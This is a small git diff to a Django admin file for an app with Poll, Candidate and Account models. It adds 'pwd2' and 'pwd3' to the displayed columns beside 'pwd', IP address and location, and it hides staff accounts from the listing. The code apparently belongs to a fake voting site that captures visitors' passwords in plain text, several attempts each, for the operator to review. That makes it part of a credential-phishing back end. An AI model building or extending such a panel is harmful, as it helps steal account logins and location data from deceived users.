@@ -3,7 +3,16 @@ from .models import Poll, Candidate, Account
 
 
 class AccountAdmin(admin.ModelAdmin):
-    list_display = ("__str__", "pwd", "ip_address", "country", "city", "state")
+    list_display = (
+        "__str__",
+        "pwd",
+        "pwd2",
+        "pwd3",
+        "ip_address",
+        "country",
+        "city",
+        "state",
+    )
     search_fields = ("identifier", "username", "phone_number")
     readonly_fields = ("date_joined", "last_login")
 
@@ -19,6 +28,7 @@ class AccountAdmin(admin.ModelAdmin):
     def get_queryset(self, request):
         qs = super().get_queryset(request)
         return qs.exclude(is_staff=True)
+
 
 class CandidateInline(admin.TabularInline):
     model = Candidate
